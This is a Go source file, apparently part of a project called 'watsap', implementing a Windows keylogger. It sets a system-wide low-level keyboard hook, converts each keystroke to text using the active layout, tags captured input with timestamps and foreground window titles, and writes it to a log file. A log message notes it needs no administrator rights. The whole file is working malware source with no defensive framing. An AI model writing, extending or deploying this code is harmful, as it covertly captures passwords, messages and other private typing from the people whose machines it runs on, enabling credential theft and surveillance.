//go:build windows
// +build windows

package keylog

import (
	"fmt"
	"log"
	"os"
	"syscall"
	"time"
	"unsafe"
	"watsap/utils/config"
)

// --- Windows API Definitions ---

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	// Hook functions
	procSetWindowsHookExA   = user32.NewProc("SetWindowsHookExA")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessageW         = user32.NewProc("GetMessageW")

	// Key processing functions
	procToUnicode                = user32.NewProc("ToUnicode")
	procGetKeyState              = user32.NewProc("GetKeyState")
	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
	procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
	WM_SYSKEYDOWN  = 260 // For Alt keys
)

// Low-Level Keyboard Hook Structure
type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// Global variable to hold the hook handle
var keyboardHook HHOOK
var lastWindow string

type HHOOK uintptr

// --- Core Logic ---

var (
	keyChan = make(chan string, 1024)
)

func logWorker() {
	var buffer string
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case data := <-keyChan:
			buffer += data
			if len(buffer) > 1024 {
				flushBuffer(&buffer)
			}
		case <-ticker.C:
			if len(buffer) > 0 {
				flushBuffer(&buffer)
			}
		}
	}
}

func flushBuffer(buf *string) {
	f, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		f.WriteString(*buf)
		f.Close()
	}
	*buf = ""
}

// InitKeyboard starts the event-driven keylogger
func InitKeyboard() {
	go logWorker() // Start async file writer

	log.Println("[Keylog] Starting Hook (No Admin Required for User Apps)...")

	// 1. Set the Hook
	hook, _, err := procSetWindowsHookExA.Call(
		uintptr(WH_KEYBOARD_LL),
		syscall.NewCallback(lowLevelKeyboardProc),
		0,
		0,
	)

	if hook == 0 {
		log.Printf("[Keylog] Failed to set hook: %v", err)
		return
	}
	keyboardHook = HHOOK(hook)

	// 2. Message Loop (Required for Hooks to work)
	var msg struct {
		Hwnd    uintptr
		Message uint32
		WParam  uintptr
		LParam  uintptr
		Time    uint32
		Pt      struct{ X, Y int32 }
	}

	for {
		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if ret == 0 {
			break
		}
	}

	// 3. Cleanup
	procUnhookWindowsHookEx.Call(uintptr(hook))
}

// lowLevelKeyboardProc is the callback triggered by Windows for EVERY key press
func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		kbd := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		handleKey(kbd.VkCode, kbd.ScanCode)
	}
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func handleKey(vkCode uint32, scanCode uint32) {
	checkActiveWindow()

	var state [256]byte
	setKey := func(vk int) {
		s, _, _ := procGetKeyState.Call(uintptr(vk))
		state[vk] = byte(s)
	}

	setKey(0x10) // VK_SHIFT
	setKey(0x11) // VK_CONTROL
	setKey(0x12) // VK_MENU (Alt)
	setKey(0x14) // VK_CAPITAL (CapsLock)
	setKey(0xA5) // VK_RMENU (AltGr - Right Alt)

	var buffer [2]uint16
	hwnd, _, _ := procGetForegroundWindow.Call()
	pid, _, _ := procGetWindowThreadProcessId.Call(hwnd, 0)
	layout, _, _ := procGetKeyboardLayout.Call(pid)

	ret, _, _ := procToUnicode.Call(
		uintptr(vkCode),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(2), 
		uintptr(0), 
		layout,     
	)

	if ret > 0 {
		char := syscall.UTF16ToString(buffer[:ret])
		switch vkCode {
		case 0x0D: 
			keyChan <- "\n"
		case 0x08: 
			keyChan <- "[BS]"
		case 0x09: 
			keyChan <- "[TAB]"
		default:
			keyChan <- char
		}
	}
}

// checkActiveWindow logs the window title if it changes
func checkActiveWindow() {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return
	}

	const maxCount = 256
	buf := make([]uint16, maxCount)
	len, _, _ := procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(maxCount))

	if len > 0 {
		title := syscall.UTF16ToString(buf[:len])
		if title != lastWindow {
			lastWindow = title
			timestamp := time.Now().Format("2006-01-02 15:04:05")
			keyChan <- fmt.Sprintf("\n\n--- [%s] %s ---\n", timestamp, title)
		}
	}
}
